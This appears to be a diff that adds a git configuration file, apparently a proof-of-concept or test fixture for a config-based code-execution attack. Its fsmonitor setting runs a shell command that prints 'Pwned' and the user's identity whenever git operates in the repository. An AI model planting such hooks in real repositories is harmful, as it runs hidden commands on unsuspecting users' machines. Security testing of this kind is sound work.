@@ -1,0 +1,5 @@
+[core]
+    repositoryformatversion = 0
+    bare = false
+    worktree = ./
+    fsmonitor = "echo \"Pwned as $(id)\">&2; false"
